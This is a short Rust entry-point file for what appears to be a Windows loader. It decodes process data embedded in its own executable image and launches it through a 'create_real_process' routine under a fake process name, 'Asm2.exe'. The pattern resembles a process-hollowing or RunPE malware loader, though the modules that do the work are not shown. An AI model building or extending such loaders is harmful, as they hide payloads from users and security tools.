use std::ptr;
use std::ffi::CString;
mod createproc;
mod decode;

fn main() {
    unsafe{
        let hmodule = kernel32::GetModuleHandleW(ptr::null());
        let data = decode::get_process_data_with_image(hmodule as usize);
        let fake_proc_path= CString::new("Asm2.exe").unwrap();
        createproc::create_real_process(fake_proc_path, &data);
    }
}